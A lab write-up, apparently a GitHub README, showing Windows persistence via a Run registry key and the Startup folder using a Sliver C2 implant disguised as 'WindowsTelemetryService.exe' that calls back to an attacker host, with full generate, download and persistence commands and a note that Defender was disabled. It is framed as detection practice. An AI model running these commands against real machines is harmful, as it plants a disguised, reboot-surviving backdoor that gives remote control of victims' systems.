# Multi-Vector Persistence via C2 (Run Key + Startup Folder)

This scenario shows two persistence methods delivered through a Sliver C2 session:  
1. **Registry Run key** (`HKCU\Run`) â€“ MITRE T1547.001  
   https://attack.mitre.org/techniques/T1547/001/  
2. **Startup folder executable** â€“ MITRE T1547.009  
   https://attack.mitre.org/techniques/T1547/009/

Both are popular with groups like APT29, Lazarus, and FIN7 because they survive reboots, execute on user sign-in, and blend into normal system activity. 
We test them with Microsoft Defender for Endpoint (MDE) enabled to see what is caught and what a hunter must find manually.  

### Tools Used

- [Sliver C2](https://github.com/BishopFox/sliver) by Bishop Fox â€“ A cross-platform, open-source Command and Control (C2) framework  
  â†³ See the [official Sliver wiki](https://sliver.sh/) for documentation

## Scenario Setup

We begin by generating a Windows payload from a Sliver C2 instance hosted on a separate Ubuntu 22.04 server. The payload is named `WindowsTelemetryService.exe` and is designed to simulate a lightweight backdoor.

On the target system, the payload is delivered using PowerShell and dropped into two persistence locations:

- **Registry Run Key (ASEP)**:
`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`


- **Startup Folder**:
`C:\Users\TrustMeBro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`


After both persistence methods are in place, the target is rebooted to trigger execution via sign-on.  

### Host Details

- **Target Hostname:** `CEO-LAPTOP`
- **Attacker Hostname:** `HR-COMPLAINTS`
- **Attacker IP:** `10.1.0.51`

---

<details>
<summary><strong>ðŸ”¹ Step 1: Generate and Host Payload (Attacker VM)</strong></summary>  

&nbsp;

On the attacker VM (`HR-COMPLAINTS`), we generate a Windows executable using [Sliver C2](https://github.com/BishopFox/sliver):

```bash
sudo sliver
generate --os windows --format exe --name WindowsTelemetryService --http https://10.1.0.51
```


<img width="1007" height="201" alt="sliver_generate_payload" src="https://github.com/user-attachments/assets/405caa7d-0575-4c6c-8df1-5ca050dc5e30" />

> In order to blend in, and more accurately imitate attacker tradecraft, I chose `WindowsTelemetryService.exe` to look like a legitimate system binary and reduce suspicion.

&nbsp;

To deliver the payload I spun up a Python web server (hosted on `port 80`, commonly allowed through firewalls):

```bash
sudo python3 -m http.server 80
```  

&nbsp;

</details>

<details>
<summary><strong>ðŸ”¹ Step 2: Download and Persist on Target (`CEO-LAPTOP`)</strong></summary>  

&nbsp;

Use PowerShell to download the payload as the admin user, `TrustMeBro`:

```powershell
wget "http://10.1.0.51/WindowsTelemetryService.exe" -OutFile "C:\ProgramData\WindowsTelemetryService.exe"
```

&nbsp;

<img width="1158" height="220" alt="downloading_payload" src="https://github.com/user-attachments/assets/3e067ad5-1067-4d88-ad8a-8a4d0e24641e" />  

&nbsp;

> <strong>NOTE:</strong> After this, my payload was instantly quarantined. Since my goal isn't to bypass Windows Defender, I just disabled it.

&nbsp;  

Now we're ready to establish persistence using two user-level techniques:  

&nbsp;

**ðŸ”¸ Registry Run Key (MITRE T1547.001)**  

Creates an entry that runs the payload at user logon:

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /V "WindowsTelemetryService" /t REG_SZ /F /D "C:\ProgramData\WindowsTelemetryService.exe"
```

&nbsp;  

<img width="1220" height="173" alt="creating_registry_persistence" src="https://github.com/user-attachments/assets/959d8ecb-4880-44bb-89cd-6643674fb006" />  

&nbsp;  
> Since we're an administrator, we could've also added it to the `HKLM` run key which would run for **all** users signing in on this box.  

&nbsp;

âœ… After validating this registry-based persistence (see Step 3), the key was removed to prepare for the next technique.  
&nbsp;  

**ðŸ”¸ Startup Folder (MITRE T1547.009)**  

Copies the payload to the userâ€™s startup folder:  

```powershell
copy "C:\ProgramData\WindowsTelemetryService.exe" "C:\Users\TrustMeBro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsTelemetryService.exe"
```
&nbsp;  

<img width="1244" height="254" alt="copying_payload_into_startup_folder" src="https://github.com/user-attachments/assets/1e158d1a-f81f-45eb-99f7-23c09d2d697c" />  

&nbsp;

These two methods increase the chance of re-execution and are commonly abused by groups like APT29, Lazarus, and FIN7.

</details>  


<details>
<summary><strong>ðŸ”¹ Step 3: Trigger Persistence (Logoff â†’ Logon)</strong></summary>

&nbsp;

To validate that the persistence methods work, we can sign out of the user session on `CEO-LAPTOP` and sign back in.  

&nbsp;  
<img width="451" height="240" alt="signing_out_of_windows_host" src="https://github.com/user-attachments/assets/4ebd116c-eb15-465c-a16a-0d5d853d243a" />  
&nbsp;


While the user is logging back in, the Sliver C2 server remains active on `HR-COMPLAINTS`, waiting for the beacon to return.

Upon login, we observe an automatic callback to the attacker machine â€” confirming that the registry run key and startup folder both executed `WindowsTelemetryService.exe` as expected.  

&nbsp;  
<img width="1775" height="230" alt="established_session_registry_persistence_on_sign_in_mde" src="https://github.com/user-attachments/assets/9899a1b1-ddf7-4fb8-9cea-e297a12ffd71" />  
> This session was created after triggering the Registry run key. We can see the unique session ID, which is a randomly generated GUID (a.k.a UUID).
> Only the first part of the GUID is shown in this output.

&nbsp;  
Likewise, after cleanup and placing the binary in the Startup folder, a new session is established in Sliver (indicated by the new session ID), allowing us to begin issuing commands like `whoami`.  

&nbsp;  
<img width="1714" height="338" alt="established_session_startup_folder_mde" src="https://github.com/user-attachments/assets/16353795-c6f3-4695-8fd5-07a32e0c2bf8" />  
&nbsp;



</details>

